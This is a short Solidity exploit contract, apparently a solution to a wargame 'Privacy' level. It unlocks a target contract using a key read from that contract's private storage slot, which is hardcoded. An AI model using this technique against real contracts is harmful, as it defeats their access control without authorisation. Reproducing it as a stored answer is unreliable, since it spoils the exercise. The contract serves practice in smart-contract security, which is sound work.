// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract Hack{
    IPrivacy victimContract;

    constructor(address _victim){
        victimContract = IPrivacy(_victim);
    }

    function attack() public {
        // used web3.eth.getStorageAt(instance, "6") to obtain data[2]
        bytes memory keyBytes = hex"22e6f3f53014da45a7df87911c38da70a0a325f2a5883549404d09a0162944f1";
        bytes16 key = bytes16(keyBytes);  // Convert to 16-byte slice of `bytes memory`
        victimContract.unlock(key);
    }

    function getUnlocked() public view {
        //victimContract.getUnlocked();
    }

}